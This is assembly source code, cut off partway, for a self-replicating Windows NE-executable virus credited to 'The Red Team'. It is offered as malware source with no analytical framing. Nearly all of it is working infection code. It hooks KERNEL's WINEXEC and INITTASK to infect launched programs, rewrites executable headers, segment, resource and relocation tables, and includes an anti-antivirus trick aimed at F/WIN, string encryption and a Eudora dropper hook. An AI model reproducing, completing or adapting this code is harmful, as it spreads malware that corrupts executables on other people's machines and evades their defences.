;=======================(Code Warez)=========================================
;
; Crazy Windows Virus
;
include cwv.ash

;-----------------------(Happy Numbers)--------------------------------------

number_of_relocation_items = ((ofs End_Relocation_Table - ofs Relocation_Table) / 4)

V_Size		=	129Eh 	; ofs vend - get this from MAP file
Additional_Size	=	(V_Size + (number_of_relocation_items * 8) + 2)

Marker		equ	73

;----------------------------------------------------------------------------
;
; TASM Windows model stuff..
;

		.model small, WINDOWS PASCAL
		.386p
		.data

		db	32 dup(?)

;----------------------(Infection Entry Point)-------------------------------

		.code
		assume 	ds:@code, es:@code
		org	0h

vstart:		push	ofs vend
old_IP		=	$-2
		pushf
		push	ds es
		pushad
		mov	bp,sp

		jmp	no_eudora
eudora_switch	=	$-2
eudora_on	=	03Ch		; cmp al
eudora_off	=	0EBh		; jmp short

		call	Eudora_Drop

	no_eudora:
		call	Init_Variables
		call	Init_BigBuffer

		jmp	over_FWIN_warez
		;
		; F/WIN sez: if CS has a relocation item that calls 
		; KERNEL.91, i.e. INITTASK, that item must never 
		; point before IP, and no further ahead of IP then 
		; 100h bytes. Further more, if this item is within
		; the 100h bytes from IP range, it is no longer
		; nescessary to continue checking the CS relocation
		; items. Bite me Stefan.
		;
aINITTASK:	jmp	far ptr INITTASK	; 91
		
over_FWIN_warez:;
		; Get KERNEL handle, open file.
		;
		call	Get_KERNEL_Handle
		call	Open_Module_Handle
		;
		; Read in Many-a-Table.
		;
		call	Read_NE_Header
		;
		; Check if we have that Win32 (95,NT) shiznit..
		; - We see if CallProc32w is exported..
		;
		push	wo ss:[bp.FileHandle]		; hFile
		push	dwo ss:[bp.NE_Header.neh_NonResNamesTable_FilePos]
		push	0				; lOffset,iOrigin
		call	a_LLSEEK
		push	wo ss:[bp.FileHandle]		; hFile
		push	wo ss:[bp.BigBuffer_Selector]
		push	0				; lpBuffer
		push	0FE00h				; wBytes
		call	a_LREAD
		mov	bx,ax
		xor	esi,esi
		mov	ds,wo ss:[bp.BigBuffer_Selector]
		push	cs
		pop	es
    w32expl:	cmp	bx,si
		jbe	w32nf
		lodsb
		cbw
		xchg	cx,ax
		jcxz	w32nf
		cmp	cx,11
		jne	w32next
		call	skipCP32
		 db	'CALLPROC32W'
    skipCP32:	pop	di
		repe	cmpsb
		jne	w32next
		dec	wo ss:[bp.Win32_Present]
		jmp	w32nf
    w32next:	add	si,cx
		lodsw
		jmp	w32expl
    w32nf:	;
		; Allocate Buffer for Entry Table, and Read it.
		;
		movzx	eax,wo ss:[bp.NE_Header.neh_EntryTable_Length]
		push	eax			; lSize
		call	Allocate_Buffer
		mov	wo ss:[bp.EntryTable_Selector],ax
		push	wo ss:[bp.FileHandle]		; hFile
		push	ax
		push	0				; lpBuffer
		push	wo ss:[bp.NE_Header.neh_EntryTable_Length]; wBytes
		 push	wo ss:[bp.FileHandle]		; hFile
		 movzx	eax,wo ss:[bp.NE_Header.neh_EntryTable_Ofs]
		 add	eax,dwo ss:[bp.NEHeader_FilePos]
		 push	eax				; lOffset
		 push	0				; iOrigin
		 call	a_LLSEEK
		call	a_LREAD
		;
		; Get WINEXEC or INITTASK Entry Point.
		;
		mov	ax,166			; WINEXEC Ordinal.
		test	by ss:[bp.Win32_Present],-1
		jz	n32p
		mov	al,91			; INITTASK Ordinal.
    n32p:	call	Get_Entry_PTR
		push	ds si
		mov	wo ss:[bp.TargetSegment],dx
		mov	wo ss:[bp.WINEXEC_Offset],ax
		;
		; Add virus, and redirect WINEXEC and/or INITTASK
		;
		call	Add_Virus_to_Segment
		pop	si ds
		mov	ax,ofs New_WINEXEC
		test	by ss:[bp.Win32_Present],-1
		jz	n32q
		mov	al,LOW (ofs New_INITTASK)
    n32q:	add	ax,wo ss:[bp.TargetDelta]
		mov	wo ds:[si-2],ax
		;
		; Rewrite NE Header and Entry Table
		;
		call	Write_NE_Header
		push	wo ss:[bp.FileHandle]		; hFile
		push	wo ss:[bp.EntryTable_Selector]
		push	0				; lpBuffer
		push	wo ss:[bp.NE_Header.neh_EntryTable_Length]; wBytes
		 push	wo ss:[bp.FileHandle]		; hFile
		 movzx	eax,wo ss:[bp.NE_Header.neh_EntryTable_Ofs]
		 add	eax,dwo ss:[bp.NEHeader_FilePos]
		 push	eax				; lOffset
		 push	0				; iOrigin
		 call	a_LLSEEK
		call	a_LWRITE
		;
		; Fix DOS EXE Header if nescessary.
		;
		; (KRNL286.EXE and KRNL386.EXE for Windows 3.x are
		; loaded using INT 21h, AX=4B00h. I am not sure how
		; Win95 and NT load KRNL386.EXE, but the Win95 Kernel
		; contains the appropriate DOS loader stub, and the
		; DOS EXE Load Image size contains all the NE
		; segments. I explicitly check if the fix up is
		; needed anyway.. better safe than sorry..)
		;
		call	DOS_Header_IO
		call	a_LREAD
		mov	cx,wo ss:[bp.DOS_Header.eh_Pages_Mod512]
		jcxz	ehmod1
		dec	wo ss:[bp.DOS_Header.eh_Pages_Div512]
	ehmod1:	mov	ax,512
		mul	wo ss:[bp.DOS_Header.eh_Pages_Div512]
		add	ax,cx
		adc	dx,0
		push	dx ax
		pop	eax
		movzx	edx,wo ss:[bp.DOS_Header.eh_Header_Paragraphs]
		shl	edx,4
		add	edx,eax
		cmp	edx,dwo ss:[bp.MoveFromPos]
		jle	_abort_infection
		movzx	edx,wo ss:[bp.MoveSize]
		add	eax,edx
		push	eax
		pop	ax dx
		mov	cx,512
		div	cx
		or	dx,dx
		jz	ehmod0
		inc	ax
	ehmod0:	mov	wo ss:[bp.DOS_Header.eh_Pages_Mod512],dx
		mov	wo ss:[bp.DOS_Header.eh_Pages_Div512],ax
		call	DOS_Header_IO
		call	a_LWRITE

 _abort_infection: 
		jmp	abort_infection

;----------------------(Just a bit of optimization warez)--------------------

DOS_Header_IO:		push	wo ss:[bp.FileHandle]	; hFile
			push	L 0			; lOffset
			push	0			; iOrigin
			call	a_LLSEEK
			pop	dx
			push	wo ss:[bp.FileHandle]	; hFile
			push	ss
			lea	ax,[bp.DOS_Header]
			push	ax			; lpBuffer
			push	eh_Size			; wBytes
			jmp	dx

;----------------------(And thensome..)--------------------------------------

Get_KERNEL_Handle:	push	L 12345678h
			org	$-4
			db	'EL',0,0
			push	L 12345678h
			org	$-4
			db	'KERN'
			mov	ax,sp
			push	ss
			push	ax	; lpModuleName
			call	aGETMODULEHANDLE
			add	sp,8
			ret

;----------------------(New INITTASK Handler)--------------------------------

New_INITTASK:		push	1234h
old_INITTASK		=	$-2
			pushf
			push	ds es
			pushad
			call	Get_KERNEL_Handle
			push	ax
			call	aGETEXEPTR
			push	ax
	oitl:		pop	ds
			xor	si,si
			mov	cx,wo ds:[si.06h]
			cmp	cx,20h
			jl	oito
			mov	ds,cx
			cmp	wo ds:[si],'EN'
			jne	oito
			push	ds
			mov	si,wo ds:[si.neh_ResourceTable_Ofs]
			mov	ax,wo ds:[si-2]
			call	Infect_ModuleHandle
			jmp	oitl
	oito:		popad
			pop	es ds
			popf
			ret
					
;----------------------(New WINEXEC Handler)---------------------------------

New_WINEXEC:		push	bp
			mov	bp,sp
			push	ofs _weretf	; QEMM8 RSRCDLL compatible.
RSRCDLL_Push		=	$-2
			push	dwo ss:[bp.08h]
			push	wo ss:[bp.06h]
			push	cs
			mov	ax,?
old_WINEXEC		=	$-2
			call	ax
			cmp	ax,20h
			jl	_weni
			call	Infect_ModuleHandle
	_weni:		mov	sp,bp
			pop	bp
	_weretf:	retf	6

;----------------------------------------------------------------------------

txt0:	db	'<<-RED TEAM->> (C) The Soul Manager.',0

;----------------------(Application Infection Routine)-----------------------

PUBLIC			Infect_ModuleHandle
Infect_ModuleHandle	proc	near
		pushf
		push	ds es
		pushad
		mov	bp,sp

                call	Init_Variables
		call	Init_BigBuffer
		;
		; if we are infecting dropper, ax is signed
		;
		mov	ax,wo ss:[bp+1Ch]
		xor	ah,80h
		js	im1
		mov	wo ss:[bp.FileHandle],ax
		jmp	im2
		;
		;
		; Check out Module's Handle..
		; We only want applications.. not that DLL shiznit..
		; We only want apps that are API/PM compat..
		; We dont want modules with more then 1 instance..
		;
	im1:	push	wo ss:[bp+1Ch]
		call	aGETEXEPTR
		xor	si,si
		or	ax,ax
		jz	abort_infection
		mov	ds,ax
		cmp	wo ds:[si.02h],1
		jne	_jneai
		test	by ds:[si.neh_Application_Flags],80h
	_jneai:	jnz	_kai
		test	by ds:[si.neh_Application_Flags],02h
		jz	abort_infection
		;
		; Open File and get what we want.
		;
		mov	ax,wo ss:[bp+1Ch]
		call	Open_Module_Handle			
	im2:	call	Read_NE_Header
		;
		; We only want Windows/Win386.. not that OS/2 shiznit..
		; or (European DOS 4, PHAR-LAP, etc shiznit..)
		;
		cmp	by ss:[bp.NE_Header.neh_TargetOS],02h
		je	gos
		cmp	by ss:[bp.NE_Header.neh_TargetOS],04h
	_kai:	jne	kmia
	gos:
		;cmp	dwo ss:[bp.NE_Header.neh_FileLoad_CRC],'TSET'
		;jne	kmia		; close abort infection
		
		;
		; Find KERNEL's index in Module Reference Table.
		; Abort if we cant.
		;
		movzx	eax,wo ss:[bp.NE_Header.neh_ModuleReference_Count]
		cmp	eax,(0FE00h / 12h)
		ja	kmia
		push	ax
		lea	eax,[eax + (eax * 8)]
		add	eax,eax
		sub	ax,wo ss:[bp.NE_Header.neh_ModuleReference_Ofs]
		add	ax,wo ss:[bp.NE_Header.neh_ImpNamesTable_Ofs]
		mov	wo ss:[bp.ModuleTable_Length],ax
		push	eax	; lSize
		call	Allocate_Buffer
		mov	wo ss:[bp.ModuleTable_Selector],ax
		movzx	eax,wo ss:[bp.NE_Header.neh_ModuleReference_Ofs]
		add	eax,dwo ss:[bp.NEHeader_FilePos]
		push	wo ss:[bp.FileHandle]		; hFile
		push	eax				; lOffset
		push	0				; iOrigin
		call	a_LLSEEK
		push	wo ss:[bp.FileHandle]		; hFile
		push	wo ss:[bp.ModuleTable_Selector]
		push	0				; lpBuffer
		push	wo ss:[bp.ModuleTable_Length]	; wBytes
		call	a_LREAD
		cmp	ax,wo ss:[bp.ModuleTable_Length]
		jne	kmia	; abort_infection
		pop	cx
		mov	ds,wo ss:[bp.ModuleTable_Selector]
		xor	si,si
		mov	wo ss:[bp.Kernel_ModuleIndex],si
		mov	di,wo ss:[bp.NE_Header.neh_ImpNamesTable_Ofs]
		sub	di,wo ss:[bp.NE_Header.neh_ModuleReference_Ofs]
  kmil:		inc	wo ss:[bp.Kernel_ModuleIndex]
		lodsw
		add	ax,di
		cmp	ax,wo ss:[bp.ModuleTable_Length]
		jae	kmia
		xchg	bx,ax
		cmp	dwo ds:[bx],'xxxx'
		org	$-4
		db	06h,'KER'	
		jne	kmi0
		cmp	dwo ds:[bx.3],'xxxx'
		org	$-4
		db	'RNEL'	
		je	kmif
  kmi0:		loop	kmil
  kmia:		jmp	abort_infection
  kmif:		;
		; INFECT, INFECT!
		;
		push	wo ss:[bp.NE_Header.neh_CSIP.2]
		pop	wo ss:[bp.TargetSegment]
		call	Add_Virus_to_Segment
		push	wo ss:[bp.TargetDelta]
		pop	wo ss:[bp.NE_Header.neh_CSIP]
		call	Write_NE_Header
		;
		; Fix Module Handle Structure
		;
		mov	ax,wo ss:[bp+1Ch]
		cmp	ax,20h
		jl	hresd
		push	ax
		call	aGETEXEPTR
		mov	es,ax
		xor	si,si
		; Fix Segment Table
		mov	cx,wo ss:[bp.NE_Header.neh_SegmentTable_Count]
		mov	ds,wo ss:[bp.SegmentTable_Selector]
		mov	di,wo es:[si.neh_SegmentTable_Ofs]
  hsegl:	movsw
		cmpsw
		cmpsd
		scasw		
		loop	hsegl
		; Fix Resource Table
		xor	si,si
		mov	di,wo es:[si.neh_ResourceTable_Ofs]
		mov	ax,wo ss:[bp.ResourceTable_Selector]
		or	ax,ax
		jz	hresd
		mov	ds,ax
		cmpsw
  hresl0:	lodsw
		scasw
		or	ax,ax
		jz	hresd
		lodsw
		scasw
		xchg	cx,ax
		cmpsd
		jcxz	hresl0
  hresl1:	 movsw
		 add	si,0Ah
		 add	di,0Ah
		 loop	hresl1
		jmp	hresl0
  hresd:
;----------------------(Blah and so forth..)---------------------------------
			;
			; Close File.
			;
abort_infection:	mov	cx,wo ss:[bp.FileHandle]
			jcxz	ainc
			push	cx		; hFile
			call	a_LCLOSE
			;
			; Unlock and Free any allocated Global Heap space.
			;
		ainc:	mov	si,ResourceTable_Selector
		ail:	mov	cx,wo ss:[bp.si]
			push	si
			jcxz	ai0
			push	cx cx			; hMem x 2
			call	aGLOBALUNLOCK
			call	aGLOBALFREE
		ai0:	pop	si
			inc	si
			inc	si
			jnz	ail
			;
			; Return to nice, happy, non-replicating code =(
			;
			mov	sp,bp
			popad
			pop	es ds
			popf
			ret

Infect_ModuleHandle	endp

;----------------------(Open File associated with Module Handle AX)----------
			
Open_Module_Handle:	push	ax			; hModule
			push	wo ss:[bp.BigBuffer_Selector]
			push	0			; lpFileName			
			push	0100h			; nSize
			call	aGETMODULEFILENAME
			push	wo ss:[bp.BigBuffer_Selector]
			push	0			; lpPathName
			push	02h			; iReadWrite
			call	a_LOPEN
			mov	wo ss:[bp.FileHandle],ax
			inc	ax
			jz	abort_infection
			ret

;----------------------------------------------------------------------------

txt1:	db	'Made in Australia - 06.97.',0

;----------------------(Add Virus to a Segment)------------------------------
;
; Input: bp.TargetSegment = segment.
;
; aborts on error.
; aborts if segment not acceptable.
; corrects segment table.
; corrects resource table.
; corrects the gangload area.
;
; Returns: bp.TargetDelta = Offset of Virus in Segment.
;
Add_Virus_to_Segment:	
	movzx	edx,wo ss:[bp.TargetSegment]
	mov	ds,wo ss:[bp.SegmentTable_Selector]
	;
	; Check Segment Attributes.
	;
	xor	esi,esi
	mov 	ax,wo ds:[esi.((edx-1) * 8).neseg_Attributes]
	xor 	ax,seg_Data+seg_RealMode+seg_ExecuteOnly
	and 	ax,seg_Data+seg_RealMode+seg_ExecuteOnly+seg_Relocations
	cmp 	ax,seg_Data+seg_RealMode+seg_ExecuteOnly+seg_Relocations
 _cai0:	jne 	abort_infection
	;
	; Check Segment Size.
	;
	mov	bx,wo ds:[esi.((edx-1) * 8).neseg_FileImage_Length]
	mov	wo ss:[bp.TargetDelta],bx
	or	bx,bx
	jz	abort_infection
	cmp	bx,(0FE00h - V_Size)
 _cai1:	ja	_cai0		; abort_infection
	;
	; Before we can move the entire file (begining 
	; after our segment) down to accommodate the 
	; virus, we must work out how much we have to 
	; move the file down by, and from what position 
	; to move it down.
	;
	mov	cx,wo ss:[bp.NE_Header.neh_SegmentTable_Shift]
	mov	bx,1
	shl	bx,cl
	dec	bx
	lea	ax,[bx + Additional_Size]
	not	bx
	and	ax,bx
	mov	wo ss:[bp.MoveSize],ax
	movzx	eax,wo ds:[esi.((edx-1) * 8).neseg_Sector_Ofs]
	movzx	ebx,wo ds:[esi.((edx-1) * 8).neseg_FileImage_Length]
	shl	eax,cl
	add	eax,ebx
	mov	dwo ss:[bp.InsertPos],eax
	push	eax
	push	wo ss:[bp.FileHandle]	; hFile
	push	eax			; lOffset
	push	0			; iOrigin
	call	a_LLSEEK
	push	wo ss:[bp.FileHandle]	; hFile
	push	ss
	lea	ax,ss:[bp.Relocation_Count]
	push	ax			; lpBuffer
	push	2			; wBytes
	call	a_LREAD
	movzx	edx,wo ss:[bp.Relocation_Count]
	pop	eax
	cmp	edx,(0FE00h - (L Additional_Size) + 8) / 8
	ja	_cai1
	lea	eax,[eax + (edx * 8) + 2]
	mov	dwo ss:[bp.MoveFromPos],eax
	;
	; Then we fix the Segment Table.
	;
	mov	cx,wo ss:[bp.NE_Header.neh_SegmentTable_Shift]
	push	cx
	mov	ax,wo ss:[bp.NE_Header.neh_SegmentTable_Count]
	mov	dx,wo ss:[bp.MoveSize]
	shr	dx,cl
	xor	ebx,ebx
	inc	bx
	shl	ebx,cl
	dec	ebx
	add	ebx,dwo ss:[bp.MoveFromPos]
	shr	ebx,cl
	xchg	ax,cx
	xor	eax,eax
	xor	esi,esi
	mov	ds,wo ss:[bp.SegmentTable_Selector]
 segfl:	cmp	wo ds:[esi.(eax * 8).neseg_Sector_Ofs],bx
	jb	segnf
	add	wo ds:[esi.(eax * 8).neseg_Sector_Ofs],dx
 segnf:	inc	eax
	loop	segfl
	mov	ax,wo ss:[bp.TargetSegment]
	mov	cx,wo ds:[esi.((eax-1) * 8).neseg_FileImage_Length]
	add	cx,V_Size
	mov	wo ds:[esi.((eax-1) * 8).neseg_FileImage_Length],cx
	cmp	wo ds:[esi.((eax-1) * 8).neseg_MemImage_Length],cx
	jae	segnm
	cmp	wo ds:[esi.((eax-1) * 8).neseg_MemImage_Length],0
	je	segnm
	mov	wo ds:[esi.((eax-1) * 8).neseg_MemImage_Length],cx
 segnm:	;
	; And the Gangload Area.
	;
	mov	ax,wo ss:[bp.NE_Header.neh_GangloadArea_Ofs]
	cmp	ax,bx
	jb	gla0
	add	wo ss:[bp.NE_Header.neh_GangloadArea_Ofs],dx
	jmp	gla_d
 gla0:	add	ax,wo ss:[bp.NE_Header.neh_GangloadArea_Length]
	cmp	ax,bx
	jb	gla_d
	add	wo ss:[bp.NE_Header.neh_GangloadArea_Length],dx
	;
	; And the Resource Table.
	;
 gla_d:	pop	cx
	mov	ax,wo ss:[bp.ResourceTable_Selector]
	or	ax,ax
	jz	nres0
	mov	ds,ax
	lodsw
	sub	cx,ax
	jb	abort_infection
	shl	dx,cl
	shl	bx,cl
 resl0:	lodsw		; resource type.
	or	ax,ax
	jz	resd	; last resource?
	lodsw		; # of resources of this type.
	xchg	cx,ax
	lodsd		; reserved.
	jcxz	resl0
 resl1:	 cmp	si,wo ss:[bp.ResourceTable_Length]
	 jae	abort_infection
	 lodsw
	 cmp	ax,bx
	 jb	resnf
	 add	wo ds:[si-2],dx
 resnf:	 add	si,0Ah
	 loop	resl1
	jmp	resl0
 resd:	mov	wo ss:[bp.ResourceTable_Length],si
	;
	; Now we do the actual moving in 64k chunks. (well just under..)
	;
 nres0:	push	wo ss:[bp.FileHandle]		; hFile
	movzx	eax,wo ss:[bp.MoveSize]
	add	eax,0FE00h
	push	eax				; lOffset
	push	2				; iOrigin
	call	a_LLSEEK
	;LOOP:
 fmovl:	push	wo ss:[bp.FileHandle]		; hFile
	movzx	eax,wo ss:[bp.MoveSize]
	add	eax,(0FE00h * 2)
	neg	eax
	push	eax				; lOffset
	push	1				; iOrigin
	call	a_LLSEEK
	push	dx ax
	pop	eax
	mov	wo ss:[bp.ReadWrite_Length],0FE00h
	sub	eax,dwo ss:[bp.MoveFromPos]
	jnl	fmov0
	add	eax,0FE00h
	mov	wo ss:[bp.ReadWrite_Length],ax
	push	wo ss:[bp.FileHandle]		; hFile
	push	dwo ss:[bp.MoveFromPos]		; lOffset
	push	0				; iOrigin
	call	a_LLSEEK
 fmov0:	push	wo ss:[bp.FileHandle]		; hFile
	push	wo ss:[bp.BigBuffer_Selector]
	push	0				; lpBuffer
	push	wo ss:[bp.ReadWrite_Length]
	call	a_LREAD
	cmp	ax,wo ss:[bp.ReadWrite_Length]
	jne	abort_infection
	movzx	eax,wo ss:[bp.MoveSize]
	movzx	edx,wo ss:[bp.ReadWrite_Length]
	sub	eax,edx
	push	wo ss:[bp.FileHandle]		; hFile
	push	eax				; lOffset
	push	1				; iOrigin
	call	a_LLSEEK
	push	wo ss:[bp.FileHandle]		; hFile
	push	wo ss:[bp.BigBuffer_Selector]
	push	0				; lpBuffer
	push	wo ss:[bp.ReadWrite_Length]
	call	a_LWRITE
	cmp	ax,wo ss:[bp.ReadWrite_Length]
	jne	_jne_cai_0
	cmp	ax,0FE00h
	je	fmovl
	;
	;            
	; Create happy, smiling virus image.
	;
	call	cvi_delta
cvi_delta:pop	si
	sub	si,(ofs cvi_delta - ofs vstart)
	mov	es,wo ss:[bp.BigBuffer_Selector]
	xor	di,di
	mov	cx,V_Size
	rep	movs by es:[di], by cs:[si]
	;
	; Save IP and INITTASK/WINEXEC Entrypoint.
	; Fix WINEXEC Entrypoint.
	;
	mov	si,ofs old_WINEXEC
	push	wo ss:[bp.NE_Header.neh_CSIP]
	push	wo ss:[bp.WINEXEC_Offset]
	push	wo ss:[bp.WINEXEC_Offset]
	push	es
	pop	ds
	pop	wo ds:[si.(ofs old_INITTASK - ofs old_WINEXEC)]
	pop	wo ds:[si.(ofs old_WINEXEC - ofs old_WINEXEC)]
	pop	wo ds:[si.(ofs old_IP - ofs old_WINEXEC)]
	mov	ax,ofs _weretf
	add	ax,wo ss:[bp.TargetDelta]
	mov	dwo ds:[si.(ofs New_WINEXEC - ofs old_WINEXEC)],'xxxx'
	org	$-4                   ;
		push	bp            ; Part of the mov.
		mov	bp,sp         ;
		push	1234h	      ;
		org	$-2
	mov	wo ds:[si.(ofs RSRCDLL_Push - ofs old_WINEXEC)],ax
	;
	; Crypt the texts..
	;
	mov	si,ofs txtTable
	mov	cl,3
	mov	bx,wo ss:[bp.TargetDelta]
	add	bx,wo ds:[txt0]
	xor	bx,wo ds:[txt1]
	add	bx,wo ds:[txt2]
 tcl1:	add	bl,bh
	lodsw
	xchg	di,ax
 tcl0:	mov	al,by ds:[di]
	xor	al,bl
	cmp	al,bl
	je	tcel0
	stosb
	jmp	tcl0
 tcel0:	loop	tcl1
	;
	; Toggle Eudora Switch
	;
	mov	al,eudora_off
	test	bl,0111b
	jnz	es1
	mov	al,eudora_on
 es1:	mov	by ds:[eudora_switch],al
	;
	; Read in Current Relocation Items.
	;
	push	wo ss:[bp.FileHandle]	; hFile
	push	dwo ss:[bp.InsertPos]	; lOffset
	push	0			; iOrigin
	call	a_LLSEEK
	mov	cx,wo ss:[bp.Relocation_Count]
	shl	cx,3
	inc	cx
	inc	cx
	push	cx
	push	wo ss:[bp.FileHandle]	; hFile
	push	ds
	push	ofs vend			; lpBuffer
	push	cx			; wBytes
	call	a_LREAD
	pop	di
	cmp	ax,di
_jne_cai_0: jne	abort_infection
	;
	; Do the INITTASK Anti-F/WIN thing.
	;
	mov	si,ofs vend
	add	di,si
	lodsw
	xchg	cx,ax
 afwl:	cmp	wo ds:[si],0103h	; PTR, Module Import
	jne	afw0
	mov	ax,wo ds:[si.4]		; Module Reference (we want KERNEL)
	cmp	ax,wo ss:[bp.Kernel_ModuleIndex]
	jne	afw0
	cmp	wo ds:[si.6],91		; Import Ordinal (we want INITTASK)
	jne	afw0
	mov	by ds:[si.1],00h	; Change it to PTR reloc,
	push	wo ss:[bp.TargetSegment]
	pop	wo ds:[si.4]		; to our segment,
	mov	ax,ofs aINITTASK
	add	ax,wo ss:[bp.TargetDelta]
	mov	wo ds:[si.6],ax		; and our INITTASK.
 afw0:	add	si,8
	loop	afwl
	;
	; Append Our Relocation Items.
	;
	mov	cx,number_of_relocation_items
	add	wo ds:[vend],cx
	mov	si,ofs Relocation_Table
	push	ds
	pop	es
movrl0:	mov	al,03h
	stosb
	mov	al,01h
	cmp	wo ss:[bp.WINEXEC_Offset],0
	pushf
	je	movrk0
	dec	ax	; 00h (should it be 04h - additive?)
movrk0:	stosb
	lodsw
	mov	bx,ax
	add	ax,wo ss:[bp.TargetDelta]
	stosw
	mov	dwo ds:[bx],'xxxx'
	org	$-4
	dw	0FFFFh,0h
	lodsw
	popf
	je	movrk1
	push	ds si cx
	call	Get_Entry_PTR
	pop	cx si ds
	push	dx ax
	jmp	movrnk
movrk1:	push	wo ss:[bp.Kernel_ModuleIndex]
	push	ax
movrnk:	pop	eax
	rol	eax,16
	stosd
	loop	movrl0
	;
	; Write Virus and Relocation Items.
	;
	push	wo ss:[bp.FileHandle]	; hFile
	push	ds
	push	0			; lpBuffer
	push	di			; wBytes
	 push	wo ss:[bp.FileHandle]	; hFile
	 push	dwo ss:[bp.InsertPos]	; lOffset
	 push	0			; iOrigin
	 call	a_LLSEEK		
	call	a_LWRITE
	;
	; Write corrected Resource and Segment Tables.
	;
	movzx	eax,wo ss:[bp.NE_Header.neh_SegmentTable_Ofs]
	add	eax,dwo ss:[bp.NEHeader_FilePos]
	push	wo ss:[bp.FileHandle]	; hFile
	push	eax			; lOffset
	push	0			; iOrigin
	call	a_LLSEEK
	push	wo ss:[bp.FileHandle]	; hFile
	mov	ax,wo ss:[bp.NE_Header.neh_SegmentTable_Count]
	shl	ax,3
	push	wo ss:[bp.SegmentTable_Selector]
	push	0			; lpBuffer
	push	ax			; wBytes
	call	a_LWRITE
	cmp	wo ss:[bp.ResourceTable_Selector],0
	je	nres2
	movzx	eax,wo ss:[bp.NE_Header.neh_ResourceTable_Ofs]
	add	eax,dwo ss:[bp.NEHeader_FilePos]
	push	wo ss:[bp.FileHandle]	; hFile
	push	eax			; lOffset
	push	0			; iOrigin
	call	a_LLSEEK
	push	wo ss:[bp.FileHandle]		; hFile
	push	wo ss:[bp.ResourceTable_Selector]
	push	0				; lpBuffer
	push	wo ss:[bp.ResourceTable_Length]	; wBytes
	call	a_LWRITE
nres2:	ret
;----------------------------------------------------------------------------

txt2:	db	'So, so, Herr Kurtzhals - Is F/Win able to follow The Red Team?',0

;----------------------(Get PTR32 to Entry in AX)----------------------------
;
; returns DX:AX = PTR32 to Entry originally in AX
;         [SI-2] = Offset of Entry's Offset in Entry Table
;
Get_Entry_PTR:		xchg	bx,ax
			mov	ds,wo ss:[bp.EntryTable_Selector]
			xor	si,si
	geptr_mainloop:	lodsw
			movzx	dx,ah		; di -> Segment.
			movzx	cx,al		; cx -> Records in Bundle.
			or	cx,cx		; End of Table?
			jz	abort_infection
			or	dx,dx           ; Unused Entries?
			jz	geptr_unused
			cmp	dl,0FFh		; Moveable Segments?
			je	geptr_moveable

			; Fixed-Segment Entry Bundle.
	geptr_fixed:	lodsb			; skip Flags
			lodsw			; get Offset
			dec	bx
			jz	geptr_found
			loop	geptr_fixed
			jmp	geptr_mainloop

			; Unused Entry Bundled.
	geptr_unused:	dec	bx
			jz	abort_infection
			loop	geptr_unused
			jmp	geptr_mainloop

			; Moveable-Segment Entry Bundle
	geptr_moveable:	lodsb			; skip Flags
			lodsw			; skip INT 3Fh
			lodsb
			movzx	dx,al		; get Segment
			lodsw			; get Offset
			dec	bx
			jnz	geptr_not_found
	geptr_found:	ret
	geptr_not_found:loop	geptr_moveable
			jmp	geptr_mainloop
			
;----------------------(Initialize Auto-Variables)---------------------------

Init_Variables:		pop	dx
			mov	cx,(stack_var_size / 2)
	ui0:		push	0
			loop	ui0
			cld
			jmp	dx

;----------------------(Just some optimization warez)------------------------

Init_BigBuffer:		push	L 0FE00h	; lSize
			call	Allocate_Buffer
			mov	wo ss:[bp.BigBuffer_Selector],ax
			ret

;----------------------(Routine to Allocate Buffers)-------------------------
;
; allocates memory on global heap, locks it.
;
; Input: 	lSize as LONG.
; Output:	Selector, or 0 if error. as INT

Allocate_Buffer:	enter	0,0
			push	042h		; wFlags
			push	dwo ss:[bp+4]	; dwBytes
			call	aGLOBALALLOC
			or	ax,ax
			jz	allocbuf_exit
			push	ax
			push	ax		; hMem
			call	aGLOBALLOCK
			pop	ax
	allocbuf_exit:	leave
			or	ax,ax
			jz	abort_infection
			ret	4

;----------------------(Read Files NE Header)--------------------------------
;
;
; aborts on errors.
; aborts if file not infectable.
; (well any executable is infectable.. but im too lame)
; aborts if file already infected.
;
; returns: 	bp.NE_Header = NE header, 
;		bp.ResourceTable_Selector initialized.
;		bp.ResourceTable_Length initialized.
;		bp.SegmentTable_Selector initialized.
;		;
Read_NE_Header:	; Check if Infected
		;
		push	wo ss:[bp.FileHandle]	; hFile
		push	L 0			; lOffset
		push	2			; iOrigin
		call	a_LLSEEK
		mov	cx,Marker
		div	cx
		or	dx,dx
		jz	abort_infection
		;
		; Read in LONG FilePos of NE Header
		;
		push	wo ss:[bp.FileHandle]	; hFile
		push	L 03Ch			; lOffset
		push	0			; iOrigin
		call	a_LLSEEK			
		push	wo ss:[bp.FileHandle]	; hFile
		push	ss
		lea	ax,wo ss:[bp.NEHeader_FilePos]
		push	ax			; lpBuffer
		push	4			; wBytes
		call	a_LREAD
		cmp	ax,4
		jne	_jne_cai_a
		;
		; Read NE Header.
		;
		push	wo ss:[bp.FileHandle]	     ; hFile
		push	dwo ss:[bp.NEHeader_FilePos] ; lOffset
		push	0			     ; iOrigin
		call	a_LLSEEK
		push	wo ss:[bp.FileHandle]	; hFile
		push	ss
		lea	ax,[bp.NE_Header]
		push	ax			; lpBuffer
		push	neh_Size		; wBytes
		call	a_LREAD
		cmp	ax,neh_Size
  _jne_cai_a:	jne	_jne_cai_b
		;
		; Inspect it for various things:
		;	- File is NewEXE.
		;	- File is not already infected.
		;	- File is not too big for allignment shift.
		;	- File has gangload area and isnt a font.
		;
		cmp	wo ss:[bp.NE_Header.neh_Marker],'EN'	; NE Header?
		jne	abort_infection
		cmp	dwo ss:[bp.NE_Header.neh_GangloadArea_Ofs],0
		je	ngla
		mov	al,by ss:[bp.NE_Header.neh_OtherEXE_Flags]
		and	al,00001110b
		cmp	al,00001000b
  _jne_cai_b:	jne	_jne_cai_c
  ngla:		mov	cx,wo ss:[bp.NE_Header.neh_SegmentTable_Shift]
		inc	cx
		loop	rneh0
		mov	cl,9
		mov	wo ss:[bp.NE_Header.neh_SegmentTable_Shift],cx
  rneh0:	cmp	cl,4
		jb	_jc_cai_a
		push	cx
		push	wo ss:[bp.FileHandle]	; hFile
		push	L 0			; lOffset
		push	02h			; iOrigin
		call	a_LLSEEK
		pop	cx
		push	dx ax
		pop	eax
		add	eax,L (Additional_Size + 512)
		bsr	edx,eax
		sub	dx,cx
		cmp	dx,15
		ja	abort_infection
		;
		; Allocate Buffer and Read in Resource Table.
		;
		mov	ax,wo ss:[bp.NE_Header.neh_ResNamesTable_Ofs]
		sub	ax,wo ss:[bp.NE_Header.neh_ResourceTable_Ofs]
  _jc_cai_a:	jb	abort_infection
		jz	nres3
		mov	wo ss:[bp.ResourceTable_Length],ax
